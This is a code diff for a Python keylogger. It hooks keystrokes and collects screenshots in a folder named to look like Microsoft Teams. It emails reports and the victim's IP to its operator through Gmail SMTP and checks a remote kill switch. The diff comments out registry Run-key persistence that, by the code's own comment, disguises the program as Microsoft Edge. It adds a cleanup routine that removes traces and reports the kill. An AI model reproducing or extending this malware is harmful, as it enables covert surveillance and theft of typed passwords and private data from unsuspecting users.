@@ -36,6 +36,10 @@ zip_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\screenshots"
 
 curr_window = ""
 
+stop_event = threading.Event()
+poller = None
+timer = None
+
 def key_callback(event : keyboard.KeyboardEvent):
     global curr_window
 
@@ -78,6 +82,9 @@ def attach_file(msg, filepath):
     msg.attach(part)
 
 def send_report():
+    if stop_event.is_set():
+        return
+    
     print("Trying to send report")
     # try:
     if os.listdir(screenshots_folder):
@@ -109,6 +116,9 @@ def send_report():
     timer.start()
 
 def check_flag():
+    if stop_event.is_set():
+        return
+    
     print("Checking flag")
     flag = "True"
     try:
@@ -118,9 +128,9 @@ def check_flag():
         print("Failed to get flag")
 
     if flag != "True":
-        cleanup()
+        stop_event.set()
 
-    poller = threading.Timer(REPORT_INTERVAL, check_flag)
+    poller = threading.Timer(POLLING_INTERVAL, check_flag)
     poller.daemon = True
     poller.start()
 
@@ -136,12 +146,12 @@ def setup():
 
     # setup persistence 
 
-    os_type = platform.system()
-    if os_type == "Windows":
-        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
-        if not os.path.exists(location):
-            shutil.copyfile(executable, location)
-            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+    # os_type = platform.system()
+    # if os_type == "Windows":
+    #     location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+    #     if not os.path.exists(location):
+    #         shutil.copyfile(executable, location)
+    #         subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
 
     try: 
         data = str(urlopen('http://checkip.dyndns.com/').read())
@@ -159,7 +169,40 @@ def setup():
 
 def cleanup():
     print("Cleaning up")
-    sys.exit(0)
+
+    if timer is not None:
+        timer.cancel()
+
+    if poller is not None:
+        poller.cancel()
+
+    keyboard.unhook_all()
+    keyboard.unhook_all_hotkeys()
+
+    if os.path.exists(working_folder):
+        shutil.rmtree(working_folder)
+
+    os_type = platform.system()
+    if os_type == "Windows":
+        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe"
+        if os.path.exists(location):
+            os.remove(location)
+            subprocess.call(rf'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /f', shell=True, check=True)
+
+    try: 
+        data = str(urlopen('http://checkip.dyndns.com/').read())
+        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
+        msg = MIMEMultipart()
+        msg['Subject'] = f"Sucessfully killed on {ip}"
+        msg['From'] = EMAIL
+        msg['To'] = EMAIL
+
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+            smtp_server.login(EMAIL, EMAIL_PASSWORD)
+            smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
+    except Exception as e:
+        pass
+
 
 def main():
     setup()
@@ -170,7 +213,8 @@ def main():
     poller = threading.Timer(POLLING_INTERVAL, check_flag)
     poller.daemon = True
     poller.start()
-    keyboard.wait()
+    stop_event.wait()
+    cleanup()
 
 if __name__ == "__main__":
     main()
